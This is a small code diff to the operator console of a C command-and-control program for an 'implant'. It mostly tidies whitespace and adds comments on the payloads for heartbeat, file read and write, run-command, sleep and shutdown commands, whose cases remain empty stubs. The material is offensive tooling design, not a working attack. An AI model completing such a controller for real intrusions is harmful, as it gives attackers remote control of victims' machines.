@@ -32,7 +32,6 @@ int get_user_input()
 
         display_prompt();
 
-
         if (fgets(input_buffer, sizeof(input_buffer), stdin) == NULL)
         {
             printf("\n");
@@ -50,7 +49,6 @@ int get_user_input()
 
     return choice;
 }
-
 
 int main(int argc, char *argv[])
 {
@@ -99,17 +97,9 @@ int main(int argc, char *argv[])
         return 0;
     }
 
-    printf("<Succesfully established connection to implant, now waiting for HELLO...............\n");
+    printf("<Succesfully established connection to implant, now waiting for HELLO............\n");
 
-
-
-    //wait for HELLO from implant, them move onto giving the choice for the user
-
-
-
-
-
-
+    // wait for HELLO from implant, them move onto giving the choice for the user
 
     while (1)
     { // while true, as we want the connection to last until we set a
@@ -118,26 +108,34 @@ int main(int argc, char *argv[])
 
         Command user_choice = get_user_input();
 
-        printf("%d",user_choice);
+        printf("%d", user_choice);
 
         switch (user_choice)
         {
 
         case COMMAND_HEARTBEAT:
 
+            // no payload
+
         case COMMAND_READ_DATA:
+
+            // payload is the path of the file to read from
 
         case COMMAND_WRITE_DATA:
 
-            // provide the payload input, this case the command
+            // need to craft the payload for the user, so give an option for the path and contents
 
         case COMMAND_RUN_CMD:
 
-            // provide the payload input, this case the command
+            // payload is the command
 
         case COMMAND_SET_SLEEP:
 
+            // payload is the seconds we sleep for
+
         case COMMAND_SHUTDOWN:
+
+            // no payload
 
         default:
         }
